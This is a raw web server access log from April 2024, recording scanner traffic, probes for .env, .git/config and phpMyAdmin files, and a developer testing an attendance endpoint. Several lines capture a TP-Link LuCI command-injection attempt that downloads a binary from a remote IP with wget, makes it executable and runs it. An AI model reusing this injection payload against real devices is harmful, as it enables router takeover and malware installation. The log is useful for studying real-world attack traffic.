45.142.182.92 - - [25/Apr/2024:20:13:27 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
162.142.125.13 - - [25/Apr/2024:20:21:57 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.28 - - [25/Apr/2024:20:29:25 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
199.45.154.28 - - [25/Apr/2024:20:29:28 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
212.47.247.6 - - [25/Apr/2024:20:48:44 +0000] "GET /.git/config HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
57.129.23.166 - - [25/Apr/2024:20:53:37 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [25/Apr/2024:20:53:38 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [25/Apr/2024:20:59:12 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
57.129.23.166 - - [25/Apr/2024:21:35:53 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [25/Apr/2024:21:35:53 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [25/Apr/2024:21:45:25 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
185.224.128.43 - - [25/Apr/2024:21:45:29 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [25/Apr/2024:22:02:58 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.128.232.229 - - [25/Apr/2024:22:06:57 +0000] "GET / HTTP/1.1" 500 803 "-" "Linux Gnu (cow)"
83.97.73.245 - - [25/Apr/2024:22:40:59 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
146.19.24.28 - - [25/Apr/2024:22:52:38 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.129.23.166 - - [25/Apr/2024:23:06:34 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [25/Apr/2024:23:06:35 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [25/Apr/2024:23:06:41 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.190.218 - - [25/Apr/2024:23:35:48 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
143.110.222.166 - - [25/Apr/2024:23:57:36 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
57.129.23.166 - - [26/Apr/2024:00:02:07 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [26/Apr/2024:00:02:08 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.97.73.245 - - [26/Apr/2024:00:10:40 +0000] "GET /actuator/gateway/routes HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.142.182.92 - - [26/Apr/2024:00:47:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
185.16.38.111 - - [26/Apr/2024:01:01:39 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
59.91.185.205 - - [26/Apr/2024:01:04:44 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
59.91.185.205 - - [26/Apr/2024:01:04:44 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
59.91.185.205 - - [26/Apr/2024:01:04:47 +0000] "POST /HNAP1/ HTTP/1.0" 408 487 "-" "-"
143.110.222.166 - - [26/Apr/2024:01:05:08 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.113.69.147 - - [26/Apr/2024:01:27:38 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
103.113.69.147 - - [26/Apr/2024:01:29:00 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
179.43.190.218 - - [26/Apr/2024:01:46:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
157.254.164.70 - - [26/Apr/2024:01:48:44 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
157.254.164.70 - - [26/Apr/2024:01:48:45 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
185.224.128.43 - - [26/Apr/2024:01:54:03 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [26/Apr/2024:02:10:29 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
176.107.188.171 - - [26/Apr/2024:02:13:46 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
54.37.79.75 - - [26/Apr/2024:02:20:02 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [26/Apr/2024:02:20:03 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [26/Apr/2024:03:17:14 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.16.38.111 - - [26/Apr/2024:03:41:00 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
51.158.37.186 - - [26/Apr/2024:03:51:04 +0000] "HEAD / HTTP/1.1" 500 171 "-" "curl/7.81.0"
51.158.37.186 - - [26/Apr/2024:03:51:06 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3"
51.158.37.186 - - [26/Apr/2024:03:51:07 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3"
51.158.37.186 - - [26/Apr/2024:03:51:08 +0000] "GET /ads.txt HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3"
51.158.37.186 - - [26/Apr/2024:03:51:09 +0000] "GET /app-ads.txt HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3"
51.158.37.186 - - [26/Apr/2024:03:51:10 +0000] "GET /sellers.json HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3"
143.110.222.166 - - [26/Apr/2024:04:09:57 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
124.41.240.106 - - [26/Apr/2024:04:29:52 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
176.58.109.90 - - [26/Apr/2024:04:30:05 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
143.110.222.166 - - [26/Apr/2024:05:01:06 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
52.167.144.229 - - [26/Apr/2024:05:08:06 +0000] "GET /sitemap.xml.gz HTTP/1.1" 500 803 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
146.19.24.28 - - [26/Apr/2024:05:22:18 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
212.47.247.6 - - [26/Apr/2024:06:03:36 +0000] "GET /.git/config HTTP/1.1" 500 803 "-" "Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/10.1.0.2342 Mobile Safari/537.10+"
143.110.222.166 - - [26/Apr/2024:06:05:55 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
165.232.56.140 - - [26/Apr/2024:06:07:09 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
165.232.56.140 - - [26/Apr/2024:06:07:10 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
198.199.93.63 - - [26/Apr/2024:06:24:27 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
20.107.247.221 - - [26/Apr/2024:06:52:37 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.107.247.221 - - [26/Apr/2024:06:52:38 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
179.43.190.218 - - [26/Apr/2024:07:03:22 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
143.110.222.166 - - [26/Apr/2024:07:15:31 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.43 - - [26/Apr/2024:07:26:55 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [26/Apr/2024:07:42:53 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [26/Apr/2024:07:42:53 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.16.38.111 - - [26/Apr/2024:07:58:24 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
143.110.222.166 - - [26/Apr/2024:08:02:13 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
122.178.48.245 - - [26/Apr/2024:08:45:49 +0000] "POST /take_attendance HTTP/1.1" 500 803 "-" "PostmanRuntime/7.37.3"
122.178.48.245 - - [26/Apr/2024:08:46:03 +0000] "POST /take_attendance HTTP/1.1" 500 803 "-" "PostmanRuntime/7.37.3"
54.37.79.75 - - [26/Apr/2024:08:46:46 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [26/Apr/2024:08:46:47 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
122.178.48.245 - - [26/Apr/2024:08:46:53 +0000] "POST /take_attendance HTTP/1.1" 500 803 "-" "PostmanRuntime/7.37.3"
122.178.48.245 - - [26/Apr/2024:08:48:03 +0000] "POST /take_attendance HTTP/1.1" 500 803 "-" "PostmanRuntime/7.37.3"
122.178.48.245 - - [26/Apr/2024:08:48:13 +0000] "POST /take_attendance HTTP/1.1" 500 803 "-" "PostmanRuntime/7.37.3"
122.178.48.245 - - [26/Apr/2024:08:55:59 +0000] "POST /take_attendance HTTP/1.1" 500 452 "-" "PostmanRuntime/7.37.3"
122.178.48.245 - - [26/Apr/2024:08:56:16 +0000] "POST /take_attendance HTTP/1.1" 500 452 "-" "PostmanRuntime/7.37.3"
106.53.192.9 - - [26/Apr/2024:08:58:26 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
106.53.192.9 - - [26/Apr/2024:08:58:27 +0000] "GET /pmd/index.php HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
106.53.192.9 - - [26/Apr/2024:08:58:27 +0000] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
143.110.222.166 - - [26/Apr/2024:09:01:32 +0000] "GET / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
122.178.48.245 - - [26/Apr/2024:09:01:51 +0000] "POST /take_attendance HTTP/1.1" 500 452 "-" "PostmanRuntime/7.37.3"
122.178.48.245 - - [26/Apr/2024:09:02:02 +0000] "POST /take_attendance HTTP/1.1" 500 452 "-" "PostmanRuntime/7.37.3"
122.178.48.245 - - [26/Apr/2024:09:16:13 +0000] "POST /take_attendance HTTP/1.1" 200 259 "-" "PostmanRuntime/7.36.3"
122.178.48.245 - - [26/Apr/2024:09:16:28 +0000] "POST /take_attendance HTTP/1.1" 200 259 "-" "PostmanRuntime/7.36.3"
122.178.48.245 - - [26/Apr/2024:09:17:57 +0000] "POST /take_attendance HTTP/1.1" 400 213 "-" "PostmanRuntime/7.36.3"
138.197.24.249 - - [26/Apr/2024:09:20:22 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
138.197.24.249 - - [26/Apr/2024:09:20:23 +0000] "GET /Pages/log/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
